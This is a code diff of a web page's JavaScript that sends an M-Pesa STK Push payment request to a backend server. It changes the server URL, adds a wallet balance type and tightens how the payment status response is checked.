@@ -159,8 +159,8 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
   </div>
 </div>
 <script>
-const BACKEND = "https://optimapay-server.onrender.com";
-
+const BACKEND = "https://autopay-server-zflg.onrender.com/api";
+  
 const selectedAmount = localStorage.getItem("selectedAmount") || "—";
 const activationFee  = localStorage.getItem("activationFee")  || "—";
 
@@ -263,49 +263,58 @@ async function payNow(){
         "Content-Type":"application/json"
       },
       body:JSON.stringify({
-        phone: fullPhone,
-        amount: amount
-      })
+  phone: fullPhone,
+  amount: amount,
+  balanceType: "wallet"
+})
     });
 
     const data = await res.json();
 
     console.log("STK Response:", data);
 
-    if(
-      !data.checkout_request_id &&
-      !data.CheckoutRequestID
-    ){
-
-      setSpinner(false);
-      setPayBtn(false);
-
-      showFailurePopup(
-        data.message || "Failed to send STK Push"
-      );
-
-      return;
-    }
+    if (
+    data.success &&
+    (data.checkout_request_id || data.CheckoutRequestID)
+) {
 
     const checkoutId =
-      data.checkout_request_id ||
-      data.CheckoutRequestID;
+        data.checkout_request_id ||
+        data.CheckoutRequestID;
+
+    localStorage.setItem(
+        "payment1_checkout_id",
+        checkoutId
+    );
 
     setSpinner(
-      true,
-      "Waiting for M-Pesa confirmation..."
+        true,
+        "Waiting for M-Pesa confirmation..."
     );
 
     showStatus(
-      "Check your phone and enter your M-Pesa PIN.",
-      "info"
+        "Check your phone and enter your M-Pesa PIN.",
+        "info"
     );
 
     startPaymentCheck(
-      checkoutId,
-      fullPhone,
-      amount
+        checkoutId,
+        fullPhone,
+        amount
     );
+
+} else {
+
+    setSpinner(false);
+    setPayBtn(false);
+
+    showFailurePopup(
+        data.message || "Failed to send STK Push"
+    );
+
+    return;
+
+    }
 
   }catch(err){
 
@@ -416,8 +425,8 @@ function startPaymentCheck(checkoutId, phone, amount){
       console.log("Status:", data);
 
       if (
-        data.status === "completed"
-      ) {
+  (data.status || "").toLowerCase() === "completed"
+) {
 
         clearInterval(interval);
 
@@ -437,8 +446,8 @@ function startPaymentCheck(checkoutId, phone, amount){
       }
 
       else if (
-        data.status === "failed"
-      ) {
+  (data.status || "").toLowerCase() === "failed"
+) {
 
         clearInterval(interval);
 
@@ -453,8 +462,8 @@ function startPaymentCheck(checkoutId, phone, amount){
       }
 
       else if (
-        data.status === "pending"
-      ) {
+  (data.status || "").toLowerCase() === "pending"
+) {
 
         console.log(
           "Waiting for customer to complete payment..."
